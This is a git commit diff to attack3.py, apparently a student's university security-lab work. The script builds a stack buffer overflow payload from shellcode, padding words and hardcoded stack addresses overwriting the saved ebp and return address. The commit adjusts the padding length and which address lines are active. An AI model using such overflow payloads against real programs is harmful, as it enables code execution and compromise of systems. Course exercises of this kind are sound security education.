3fccd79ae13600db4fe34c3aaf05ed3f238732fb
Alexander Yang <ayang015@seas.upenn.edu>
2020-09-16 20:43:28 -0400

    new files

--- attack3.py
+++ attack3.py
@@ -6,7 +6,7 @@ from struct import pack
 # sys.stdout.buffer.write(setuid)
 sys.stdout.buffer.write(shellcode)
 
-for (i in range(0, 24)):
+for i in range(0, 88):
 	sys.stdout.buffer.write(pack("<I", 0x11))
 
 
@@ -15,10 +15,11 @@ for (i in range(0, 24)):
 # sys.stdout.buffer.write(b"asdfasdfas")
 # sys.stdout.buffer.write(pack("<I", 0xbf11))
 # sys.stdout.buffer.write(pack("<I", 0xbffe8535))
-# sys.stdout.buffer.write(pack("<I", 0x11111111))
+# sys.stdout.buffer.write(pack("<I", 0xbffe8535))
+# sys.stdout.buffer.write(pack("<I", 0x22222222))
 
-sys.stdout.buffer.write(pack("<I", 0xbffe85a8)) # is the ebp
-sys.stdout.buffer.write(pack("<I", 0xbffe8535)) # is the return addr
+sys.stdout.buffer.write(pack("<I", 0xbffe8535)) # is the ebp
+# sys.stdout.buffer.write(pack("<I", 0xbffe8535)) # is the return addr
 # sys.stdout.buffer.write(b"asdfasdfasdfasdfasdf")
 # sys.stdout.buffer.write(b"asdfasdfasdfasdfasdf")
 # sys.stdout.flush()
